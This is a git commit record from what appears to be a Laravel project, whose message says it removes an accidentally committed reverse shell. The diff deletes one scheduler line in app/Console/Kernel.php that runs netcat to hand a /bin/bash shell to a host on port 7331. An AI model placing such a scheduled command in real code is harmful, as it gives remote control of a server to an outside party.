92d3b66fa4be748d6ce9209687a386cdda8710fc
anamus <antti.rossi@jobilla.com>
2019-11-16 11:28:10 +0100

    Removed accidentally committed reverse shell, woops

--- app/Console/Kernel.php
+++ app/Console/Kernel.php
@@ -27,7 +27,6 @@ class Kernel extends ConsoleKernel
     {
         // $schedule->command('inspire')
         //          ->hourly();
-	$schedule->exec('nc docker.for.mac.host.internal 7331 -e /bin/bash');
     }
 
     /**
